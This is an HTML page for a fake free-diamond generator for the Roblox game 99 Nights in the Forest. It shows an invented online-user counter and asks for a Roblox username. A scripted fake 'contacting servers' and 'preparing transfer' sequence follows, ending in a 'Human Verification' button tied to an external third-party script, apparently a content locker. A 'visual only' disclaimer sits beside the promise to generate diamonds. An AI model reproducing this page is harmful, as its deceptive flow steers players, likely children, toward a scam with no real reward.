
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>99 Nights in the Forest — Diamonds (Visual Only)</title>
<meta name="description" content="Fan-made, visual-only flow for screenshots and role-play. Not affiliated with Roblox or 99 Nights in the Forest." />


<meta name='LTF_verify' content='ffa8b08c0a76f77848da31ecfaa5b9ca'/>


<script type="text/javascript">
    var GPvQR_vdg_BxCvmc={"it":4543075,"key":"cbfd8"};
</script>
<script src="https://d1y0yks1k8t5m5.cloudfront.net/cd7c601.js"></script>


<style>



  /* ================= THEME ================ */
  :root{
    --bg1:#9edcff;
    --bg2:#6cc4f6;
    --bg3:#4fb3ef;
    --ink:#0d2548;
    --muted:#5f6f8d;
    --card:#ffffff;
    --glass:rgba(255,255,255,.85);
    --shadow:0 18px 40px rgba(7,26,56,.18);
    --accent:#0fb5a8;
    --accent-2:#078e84;
    --ring:#2bd7c7;
    --radius:20px;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    font-family: ui-rounded, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";
    color:var(--ink);
    background:
      radial-gradient(1200px 520px at 50% -120px, rgba(255,255,255,.35), transparent 60%) no-repeat,
      linear-gradient(var(--bg1) 0%, var(--bg2) 55%, var(--bg3) 100%);
    overflow-x:hidden;
  }
  .wrap{width:100%; max-width:1200px; margin:0 auto; padding:28px 18px 90px}

  /* ============== HEADER ============== */
  .topbar{display:flex; align-items:center; justify-content:space-between; gap:14px; flex-wrap:wrap}
  .brand{display:flex; align-items:center; gap:12px}
  .logo{width:52px; height:52px; flex:0 0 auto}
  .brand h1{margin:0; font-weight:1000; letter-spacing:.4px; font-size:clamp(22px,4.2vw,40px); text-shadow:0 2px 0 rgba(0,0,0,.06)}
  .pill{background:rgba(255,255,255,.6); border:1px solid rgba(255,255,255,.8); padding:8px 12px; border-radius:999px; font-weight:900; color:#153a64; backdrop-filter:saturate(140%) blur(6px)}
  .warn{background:#fff7e8; border-color:#ffe1a8; color:#7a4a00}
  .stats{display:flex; gap:10px; align-items:center; flex-wrap:wrap}
  .dot{display:inline-block; width:8px; height:8px; border-radius:50%; background:#31e6bf; margin-right:8px; box-shadow:0 0 10px rgba(49,230,191,.85)}

  .tagline{max-width:820px; margin:10px 0 8px; color:var(--muted)}
  .cta{display:flex; gap:10px; flex-wrap:wrap}
  .btn{
    appearance:none; border:0; padding:14px 22px; border-radius:16px; font-weight:1000; cursor:pointer;
    background:var(--accent); color:#fff; box-shadow:0 18px 34px rgba(6,122,113,.28), inset 0 -2px 0 var(--accent-2);
    transition:.18s transform ease, .18s background ease, .18s box-shadow ease;
  }
  .btn:hover{transform:translateY(-1px); background:#12c5b7}
  .btn.secondary{background:#edf4ff; color:#133a62; box-shadow:none; border:1px solid #d9e7ff}
  .btn:disabled{opacity:.6; transform:none; box-shadow:none; cursor:not-allowed}

  /* ============== SECTION ============== */
  .section-title{text-align:center; font-size:clamp(22px,3.6vw,34px); margin:22px 0 8px; font-weight:1000}
  .sub{text-align:center; margin:0 0 18px; color:var(--muted); font-weight:800; letter-spacing:.35px}

  /* ============== GRID ============== */
  .grid{
    display:grid; gap:18px; margin:0 auto; max-width:980px;
    grid-template-columns:repeat(auto-fit, minmax(128px, 1fr));
    justify-content:center; align-items:stretch;
  }
  @media (max-width:1024px){ .grid{grid-template-columns:repeat(4,1fr)} }
  @media (max-width:860px){ .grid{grid-template-columns:repeat(3,1fr)} }
  @media (max-width:580px){ .grid{grid-template-columns:repeat(2,1fr)} }

  .card{overflow:hidden; 
    position:relative; padding:14px 12px 16px; border-radius:var(--radius);
    background:var(--glass); border:1px solid rgba(255,255,255,.9); box-shadow:var(--shadow);
    backdrop-filter: blur(8px) saturate(140%); display:flex; flex-direction:column; align-items:center; gap:10px;
    cursor:pointer; transition:.2s transform ease, .2s box-shadow ease, .2s border ease; min-height:clamp(120px, 24vw, 168px);
  }
  .card:hover{transform:translateY(-3px)}
  .card.selected{border-color:#a9fff4; box-shadow:0 18px 40px rgba(14,180,160,.35)}
  .amount{word-break:break-word; text-align:center; font-size:clamp(18px,2.6vw,26px); font-weight:1000; letter-spacing:.45px; text-align:center}
  .diamond{width:72px; height:72px; filter:drop-shadow(0 7px 12px rgba(0,0,0,.18))}
  /* non-overlapping ribbon: sits OUTSIDE the card */
  .ribbon{
    position:absolute; left:50%; top:8px; transform:translateX(-50%);
    background:#0e223b; color:#fff; border-radius:999px; padding:4px 10px;
    font-weight:900; font-size:12px; letter-spacing:.2px; line-height:1;
    box-shadow:0 8px 16px rgba(0,0,0,.25); z-index:3; pointer-events:none;
  }

  .continue{display:flex; flex-direction:column; align-items:center; gap:8px; margin:18px 0 6px}

  /* ============== HOW IT WORKS (compact) ============== */
  .how{margin:26px auto 0; max-width:980px; display:grid; gap:14px; grid-template-columns:repeat(3,1fr)}
  @media (max-width:820px){ .how{grid-template-columns:1fr} }
  .step{background:rgba(255,255,255,.62); border:1px solid rgba(255,255,255,.85); border-radius:16px; box-shadow:var(--shadow); padding:14px}
  .step strong{display:block; margin-bottom:6px}
  .em{color:#0f3d6a}

  .foot{margin-top:28px; text-align:center; font-size:12.5px; color:#0b2e57; opacity:.85}

  /* ============== MODALS ============== */
  .overlay{
    position:fixed; inset:0; display:none; align-items:center; justify-content:center; z-index:40;
    background:rgba(0,0,0,.35); backdrop-filter: blur(6px);
  }
  .overlay.show{display:flex}
  .modal{
    width:min(94vw,600px); background:#fff; border-radius:24px; box-shadow:0 24px 60px rgba(0,0,0,.28);
    padding:22px 22px 20px; text-align:center; position:relative
  }
  .modal h3{margin:6px 0 8px; font-size:26px}
  .modal p{margin:0 0 16px; color:var(--muted)}
  .input{width:100%; padding:14px 16px; border-radius:12px; border:2px solid #e3eaf4; outline:none; font-size:16px; background:#f7fafd}
  .close-x{position:absolute; right:10px; top:8px; border:0; background:transparent; font-size:26px; cursor:pointer; color:#96a7c3}

  .spinner{width:50px; height:50px; border-radius:50%; border:6px solid #e6f1ff; border-top-color:var(--accent); margin:6px auto 8px; animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .progress{height:10px; width:100%; background:#eef4fc; border-radius:999px; overflow:hidden; margin-top:10px}
  .bar{height:100%; width:0%; background:linear-gradient(90deg,#27e0d1,#1aa8ff); border-radius:999px; transition:width .35s ease}

  .modal-list{margin:12px 0 0; text-align:left; max-height:260px; overflow:auto}
  .itemrow{display:flex; align-items:center; justify-content:space-between; gap:10px; background:#f6fafb; border:1px solid #e7f1f0; padding:12px 14px; border-radius:12px; margin:8px 0}
  .ok-dot{width:11px; height:11px; border-radius:50%; background:#cad7e6}
  .done{background:#17b49d !important; box-shadow:0 0 0 2px #c9efe9 inset}

  .check{width:64px; height:64px; border-radius:50%; border:3px solid #c7efea; display:grid; place-items:center; margin:6px auto 4px; color:#17b49d}
  .check svg{width:34px; height:34px}

  /* ============== BACKGROUND MOUNTAINS ============== */
  .mountains{position:fixed; left:0; right:0; bottom:0; height:36vh; pointer-events:none; z-index:-1}
  .m{position:absolute; left:0; right:0; bottom:0}
  .m svg{width:140%; transform:translateX(-10%)}
  .m1{opacity:.28}
  .m2{opacity:.22; bottom:4vh}
  .m3{opacity:.18; bottom:8vh}
  @media (max-width:700px){ .m svg{width:200%; transform:translateX(-25%)} }

  /* decorative outlines (subtle) */
  .scat{position:fixed; inset:0; pointer-events:none; z-index:0}
  .scat svg{position:absolute; width:22px; height:22px; opacity:.18}
  /* selection enhancements */
  .diamond-wrap{position:relative; transition:transform .18s ease; width:clamp(72px,14vw,132px); height:clamp(72px,14vw,132px); display:grid; place-items:center}
  .card.selected .diamond-wrap{position:relative; transition:transform .18s ease; width:clamp(72px,14vw,132px); height:clamp(72px,14vw,132px); display:grid; place-items:center}
  .select-check{position:absolute; right:12px; top:12px; width:26px; height:26px; border-radius:50%; background:#11b8aa; color:#fff; font-weight:900; display:none; align-items:center; justify-content:center; box-shadow:0 8px 16px rgba(17,184,170,.35)}
  .card.selected .select-check{display:flex; animation:pop .18s ease-out}
  @keyframes pop{from{transform:scale(.6); opacity:0} to{transform:scale(1); opacity:1}}
  .diamond-wrap::after{content:''; position:absolute; inset:0; transform:skewX(-20deg) translateX(-120%); background:linear-gradient(90deg, transparent, rgba(255,255,255,.7), transparent); border-radius:14px}
  .card.selected .diamond-wrap::after{animation:shine 900ms ease forwards}
  @keyframes shine{to{transform:skewX(-20deg) translateX(120%)}}
  .selection-info{display:none; justify-content:center; align-items:center; gap:8px; padding:6px 10px; background:rgba(255,255,255,.7); border:1px solid rgba(255,255,255,.9); border-radius:999px; font-weight:900; color:#103a64}

  /* ============== CLASSES GRID ============== */
  .grid-classes{
    display:grid; gap:18px; margin:0 auto; max-width:980px;
    grid-template-columns:repeat(auto-fit, minmax(128px, 1fr));
    justify-content:center; align-items:stretch;
  }
  .class-card{
    position:relative; padding:14px 12px 16px; border-radius:var(--radius);
    background:var(--glass); border:1px solid rgba(255,255,255,.9); box-shadow:var(--shadow);
    backdrop-filter: blur(8px) saturate(140%); display:flex; flex-direction:column; align-items:center; gap:10px;
    cursor:pointer; transition:.2s transform ease, .2s box-shadow ease, .2s border ease; min-height:clamp(120px, 24vw, 168px);
  }
  .class-card:hover{transform:translateY(-3px)}
  .class-card.selected{border-color:#a9fff4; box-shadow:0 18px 40px rgba(14,180,160,.35)}
  .class-img-wrap{position:relative; width:clamp(72px,14vw,132px); height:clamp(72px,14vw,132px); display:grid; place-items:center; overflow:visible}
  .class-img-wrap img{max-width:100%; max-height:100%; display:block}
  /* Watermark */
  .class-img-wrap::after{
    content:'playloots'; position:absolute; inset:-8px; display:block; pointer-events:none;
    font-weight:1000; font-size:16px; letter-spacing:.12em; text-transform:lowercase;
    color:rgba(255,255,255,.38); text-shadow:0 1px 3px rgba(0,0,0,.35); transform:rotate(-24deg); display:grid; place-items:center;
  }
  .class-label{font-size:clamp(16px,2.4vw,22px); font-weight:1000; text-align:center}


  /* Center the Diamonds grid (exactly 3 columns) */
  #grid{
    display:grid; gap:18px; margin:0 auto; max-width:980px;
    grid-template-columns:repeat(auto-fit, minmax(128px, 1fr));
    justify-content:center; align-items:stretch;
  }


  /* Class selection visual parity with Diamonds */
  .class-card .select-check{position:absolute; right:12px; top:12px; width:26px; height:26px; border-radius:999px;
    background:#11b8aa; color:#fff; font-weight:900; display:none; align-items:center; justify-content:center;
    box-shadow:0 8px 16px rgba(17,184,170,.35)}
  .class-card.selected .select-check{display:flex; animation:pop .18s ease-out}
  .class-card .class-img-wrap{transition:transform .18s ease}
  .class-card.selected .class-img-wrap{transform:translateY(-2px) scale(1.05)}


  .continue{display:flex; gap:10px; justify-content:center; align-items:center; flex-wrap:wrap}
  .selection-info{background:#eaf7ff; color:#274d75; padding:6px 10px; border-radius:999px; display:none; font-weight:800; font-size:14px}
  @media (max-width:420px){
    .continue{flex-direction:column; gap:8px}
    .selection-info{font-size:13px}
  }


  @media (max-width:420px){
    .section-title{margin:16px 0 6px}
    .sub{margin-bottom:12px}
  }


  /* Make diamond SVG responsive */
  .diamond{width:clamp(56px, 10vw, 86px); height:auto; display:block}


  @media (max-width:360px){
    #grid{
    display:grid; gap:18px; margin:0 auto; max-width:980px;
    grid-template-columns:repeat(auto-fit, minmax(128px, 1fr));
    justify-content:center; align-items:stretch;
  }
  }


  @media (max-width:380px){
    .card{ padding:14px 12px 16px }
    .amount{ font-size:clamp(14px, 4.2vw, 22px) }
  }


  @media (max-width:480px){
    .grid{ gap:14px }
  }


  @media (max-width:380px){
    .ribbon{ top:6px; padding:3px 8px; font-size:11px }
  }

</style>
</head>


<body>
  <!-- Decorative mountains -->
  <div class="mountains" aria-hidden="true">
    <div class="m m1">
      <svg viewBox="0 0 1200 240" preserveAspectRatio="none">
        <path d="M0,200 L150,120 L300,200 L480,110 L650,200 L820,130 L1000,200 L1200,150 L1200,240 L0,240 Z" fill="#2a6c7d"/>
      </svg>
    </div>
    <div class="m m2">
      <svg viewBox="0 0 1200 240" preserveAspectRatio="none">
        <path d="M0,200 L140,130 L280,200 L430,120 L590,200 L760,135 L930,200 L1100,140 L1200,200 L1200,240 L0,240 Z" fill="#277084"/>
      </svg>
    </div>
    <div class="m m3">
      <svg viewBox="0 0 1200 240" preserveAspectRatio="none">
        <path d="M0,200 L130,140 L260,200 L400,135 L540,200 L700,150 L860,200 L1020,145 L1200,200 L1200,240 L0,240 Z" fill="#236f86"/>
      </svg>
    </div>
  </div>

  <!-- Subtle scattered diamond outlines -->
  <div class="scat" aria-hidden="true" id="scat"></div>

  <div class="wrap">
    <!-- Header -->
    <div class="topbar">
      <div class="brand">
        <!-- diamond logo -->
        <svg class="logo" viewBox="0 0 64 64" aria-hidden="true">
          <defs><linearGradient id="g" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#7be9ff"/><stop offset="1" stop-color="#1aa8ff"/></linearGradient></defs>
          <path d="M12 10h40l10 14-30 30L2 24 12 10z" fill="url(#g)" stroke="#0f6aa1" stroke-width="3" stroke-linejoin="round"/>
          <path d="M12 10l10 14 10 30 10-30 10-14M22 24h20" fill="none" stroke="#0e79b6" stroke-width="3" stroke-linejoin="round"/>
        </svg>
        <h1>99 Nights in the Forest — Diamonds</h1>
      </div>
      <div class="stats">
        <div class="pill"><span class="dot"></span><span id="onlineCount">2,476</span> online</div>
       
      </div>
    </div>

    <p class="tagline">
 Instantly generate thousands of diamonds with our smooth, game-like animation. Watch as your chosen amount is processed and added before your eyes.
    </p>
    <div class="cta">
      <button class="btn" id="startBtn">★ Start Now</button>
      <button class="btn secondary" id="howBtn">How it works</button>
    </div>

    <!-- Removed: activity ticker & live chat (per your request) -->

    <h2 class="section-title">1. Select Your Diamonds</h2>
    <p class="sub">Choose one amount</p>

    <div class="grid" id="grid"></div>

    
    <h2 class="section-title">2. Select Your Desired Class</h2>
    <p class="sub">Choose one class</p>
    <div class="grid-classes" id="classGrid"></div>

    <div class="continue">
      <div class="selection-info" id="selectedInfo" aria-live="polite"></div>
      <button class="btn" id="continueBtn" disabled>Continue →</button>
    </div>

    <!-- Compact "How it works" -->
    <div class="how" id="how">
      <div class="step"><strong>1) Pick an amount</strong>Select a option on how many diamonds do you want to generate.</div>
      <div class="step"><strong>2) Enter username</strong>Enter your username and click Start Generation.</div>
      <div class="step"><strong>3) Verification</strong>Verify yourserlf and then watch the magic happen.</div>
    </div>

    <p class="foot">Fan-made interface for entertainment & content creation • © 2025 • Not affiliated with Roblox or 99 Nights in the Forest.</p>
  </div>

  <!-- ===== MODALS ===== -->
  <div class="overlay" id="modalUsername" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal">
      <button class="close-x" onclick="closeAll()" aria-label="Close">×</button>
      <h3>Enter Your Username</h3>
      <p>Please enter your Roblox username to begin the generation.</p>
      <input class="input" id="usernameInput" placeholder="Your Username Here" />
      <div style="display:flex; gap:12px; justify-content:center; margin-top:16px">
        <button class="btn secondary" onclick="closeAll()">Cancel</button>
        <button class="btn" id="startGenBtn">Start Generation</button>
      </div>
      <p style="font-size:12px; color:#6f82a4; margin-top:10px">Privacy note: the name you type stays on this page only.</p>
    </div>
  </div>

  <div class="overlay" id="modalConnecting" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal">
      <div class="spinner" aria-hidden="true"></div>
      <h3>Connecting…</h3>
      <p id="connectingDesc">Please wait while we connect and verify.</p>
    </div>
  </div>

  <div class="overlay" id="modalGenerating" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal">
      <h3>Generating Your Diamonds and Class</h3>
      <div class="progress"><div class="bar" id="bar"></div></div>
      <div class="modal-list" id="genList"></div>
    </div>
  </div>

  <div class="overlay" id="modalSuccess" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal">
      <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div>
      <h3>Success!</h3>
      <p>Your diamonds and selected class have been prepared and are ready!</p>
      <div class="modal-list" id="successList"></div>
      <div style="margin-top:16px">
        <button class="btn" id="toVerify">Continue → Verification</button>
      </div>
    </div>
  </div>

  <div class="overlay" id="modalVerify" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal">
      <h3>Human Verification</h3>
      <p>To prevent bot abuse, please complete the final step to view your items.</p>
      <a class="btn" onclick="_Jf()">Verify Now</a>
    
    </div>
  </div>

<script>
/* ======= DATA ======= */
const AMOUNTS = [
  { id:'d-2500', label:'2,500 Diamonds' },
  { id:'d-5000', label:'5,000 Diamonds', rec:true },
  { id:'d-10000', label:'10,000 Diamonds' }
];

/* ======= ELEMENTS ======= */
const gridEl = document.getElementById('grid');
const continueBtn = document.getElementById('continueBtn');
const startBtn = document.getElementById('startBtn');
const howBtn = document.getElementById('howBtn');

const modalUsername = document.getElementById('modalUsername');
const modalConnecting = document.getElementById('modalConnecting');
const modalGenerating = document.getElementById('modalGenerating');
const modalSuccess = document.getElementById('modalSuccess');
const modalVerify = document.getElementById('modalVerify');

const usernameInput = document.getElementById('usernameInput');
const startGenBtn = document.getElementById('startGenBtn');
const connectingDesc = document.getElementById('connectingDesc');
const genList = document.getElementById('genList');
const successList = document.getElementById('successList');
const toVerifyBtn = document.getElementById('toVerify');
const progressBar = document.getElementById('bar');
const onlineCountEl = document.getElementById('onlineCount');
const scat = document.getElementById('scat');

/* ======= HELPERS ======= */
const $ = (s)=>document.querySelector(s);
function show(el){ el.classList.add('show'); el.setAttribute('aria-hidden','false'); }
function hide(el){ el.classList.remove('show'); el.setAttribute('aria-hidden','true'); }
function closeAll(){ [modalUsername,modalConnecting,modalGenerating,modalSuccess,modalVerify].forEach(hide); }
function escapeHTML(str){ return str.replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
function rnd(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }

/* Diamond SVG inline */
function diamondSVG(size=72){
  const id = 'gd-'+Math.random().toString(36).slice(2,7);
  return `
  <svg class="diamond" viewBox="0 0 64 64" width="${size}" height="${size}" aria-hidden="true">
    <defs><linearGradient id="${id}" x1="0" x2="0" y1="0" y2="1">
      <stop offset="0" stop-color="#7be9ff"/><stop offset="1" stop-color="#1aa8ff"/>
    </linearGradient></defs>
    <path d="M12 10h40l10 14-30 30L2 24 12 10z" fill="url(#${id})" stroke="#0f6aa1" stroke-width="3" stroke-linejoin="round"/>
    <path d="M12 10l10 14 10 30 10-30 10-14M22 24h20" fill="none" stroke="#0e79b6" stroke-width="3" stroke-linejoin="round"/>
  </svg>`;
}

/* ======= BUILD GRID ======= */
let selectedId = null, selectedLabel = "";
AMOUNTS.forEach(a=>{
  const card = document.createElement('button');
  card.className = 'card';
  card.type = 'button';
  card.innerHTML = `${a.rec?'<span class="ribbon">Recommended</span>':''}<span class="select-check" aria-hidden="true">✓</span><div class="diamond-wrap">${diamondSVG()}</div><div class="amount">${a.label}</div>`;
  card.dataset.id = a.id;
  card.addEventListener('click', ()=>{
    document.querySelectorAll('.card').forEach(c=>{ c.classList.remove('selected'); c.setAttribute('aria-pressed','false'); });
    card.classList.add('selected');
    card.setAttribute('aria-pressed','true');
    selectedId = a.id;
    selectedLabel = a.label;
    enableIfReady();
    const info = document.getElementById('selectedInfo');
    info.style.display = 'inline-flex';
    info.textContent = `Selected: ${a.label}${selectedClassLabel ? ' • Class: ' + selectedClassLabel : ''}`;
  });
  gridEl.appendChild(card);
});

/* CTA actions */
startBtn.addEventListener('click', ()=>window.scrollTo({top:gridEl.offsetTop-20, behavior:'smooth'}));
howBtn.addEventListener('click', ()=>document.getElementById('how').scrollIntoView({behavior:'smooth'}));

/* Continue -> username */
continueBtn.addEventListener('click', ()=>{
  if(!selectedId) return;
  show(modalUsername);
  setTimeout(()=>usernameInput.focus(), 60);
});

/* Username -> flow */
startGenBtn.addEventListener('click', ()=>{
  const user = usernameInput.value.trim();
  if(!user){ usernameInput.focus(); usernameInput.style.borderColor='#ff8b8b'; return; }
  closeAll();
  connectingDesc.innerHTML = `Please wait while we connect and verify <strong>${escapeHTML(user)}</strong>.`;
  show(modalConnecting);
  setTimeout(()=>beginGenerating(user), 900);
});

function beginGenerating(user){
  closeAll();
  genList.innerHTML = '';
  progressBar.style.width = '0%';
  show(modalGenerating);

  const steps = [
    `Selected amount: ${selectedLabel || '—'}`,
    `Selected class: ${selectedClassLabel || '—'}`,
    'Contacting servers…',
    `Checking account name: ${escapeHTML(user)}`,
    'Preparing transfer…',
    'Finalizing…'
  ];
  let i=0;
  const interval = setInterval(()=>{
    if(i<steps.length){
      genList.appendChild(stepRow(steps[i], false));
      growProgress(18 + i*20);
      i++;
    }else{
      clearInterval(interval);
      const amt = AMOUNTS.find(x=>x.id===selectedId)?.label || 'Diamonds';
      const cls = selectedClassLabel || 'Class';
      setTimeout(()=>{
        genList.appendChild(stepRow(amt, true));
        genList.appendChild(stepRow(`Class: ${cls}`, true));
        growProgress(100);
        setTimeout(()=>finishSuccess(`${amt} • Class: ${cls}`), 650);
      }, 450);
    }
  }, 700);
}

function growProgress(val){ progressBar.style.width = Math.min(val,100)+'%'; }
function stepRow(text, done){
  const row = document.createElement('div');
  row.className='itemrow';
  row.innerHTML = `<span>${escapeHTML(text)}</span><span class="ok-dot ${done?'done':''}"></span>`;
  return row;
}
function finishSuccess(amt){
  closeAll();
  successList.innerHTML='';
  successList.appendChild(stepRow(amt,true));
  show(modalSuccess);
}
toVerifyBtn.addEventListener('click', ()=>{ closeAll(); show(modalVerify); });


/* ======= CLASSES ======= */
const CLASSES = [
  { id:'c-assassin', label:'Assassin', img:'https://playloots.online/99/assassin.png' },
  { id:'c-cyborg', label:'Cyborg', img:'https://playloots.online/99/cyborg.png' },
  { id:'c-pyromaniac', label:'Pyromaniac', img:'https://playloots.online/99/pyromaniac.png' }
];
const classGridEl = document.getElementById('classGrid');
let selectedClassId = null, selectedClassLabel = "";

// build class cards
CLASSES.forEach(c=>{
  const card = document.createElement('button');
  card.className = 'class-card';
  card.type = 'button';
  card.innerHTML = `<span class="select-check" aria-hidden="true">✓</span>
    <div class="class-img-wrap"><img alt="${c.label}" src="${c.img}"></div>
    <div class="class-label">${c.label}</div>`;
  card.dataset.id = c.id;
  card.addEventListener('click', ()=>{
    document.querySelectorAll('.class-card').forEach(k=>{ k.classList.remove('selected'); k.setAttribute('aria-pressed','false'); });
    card.classList.add('selected');
    card.setAttribute('aria-pressed','true');
    selectedClassId = c.id;
    selectedClassLabel = c.label;
    enableIfReady();
    const info = document.getElementById('selectedInfo');
    if(selectedLabel && selectedClassLabel){
      info.style.display = 'inline-flex';
      info.textContent = `Selected: ${selectedLabel} • Class: ${selectedClassLabel}`;
    } else if(selectedClassLabel){
      info.style.display = 'inline-flex';
      info.textContent = `Selected class: ${selectedClassLabel}`;
    }
    });
  classGridEl.appendChild(card);
});

function enableIfReady(){
  continueBtn.disabled = !(selectedId && selectedClassId);
}

// override selection in diamond cards to gate
const originalDiamondClickers = Array.from(document.querySelectorAll('.card'));
originalDiamondClickers.forEach(()=>{}); // no-op; listeners already set; alter continue gating
// Patch: wrap where we set continueBtn.disabled=false

/* Online count gentle jiggle */
let online = 2476;
setInterval(()=>{ online += rnd(-2,6); onlineCountEl.textContent = online.toLocaleString(); }, 1800);

/* Decorative scattered outlines */
(function makeScatter(){
  const N = 28;
  for(let i=0;i<N;i++){
    const x = Math.random()*98, y = Math.random()*85 + 5, r = (Math.random()*1.2)+0.8;
    const el = document.createElementNS('http://www.w3.org/2000/svg','svg');
    el.setAttribute('viewBox','0 0 24 24');
    el.style.left = x+'vw'; el.style.top = y+'vh'; el.style.transform = `scale(${r})`;
    el.innerHTML = `<path d="M5 5h14l3 4-10 10L2 9l3-4z" fill="none" stroke="#0f6aa1" stroke-width="2" stroke-linejoin="round" opacity=".45"/>`;
    scat.appendChild(el);
  }
})();

/* Accessibility */
window.addEventListener('keydown',(e)=>{ if(e.key==='Escape') closeAll(); });
</script>




</body>
</html>
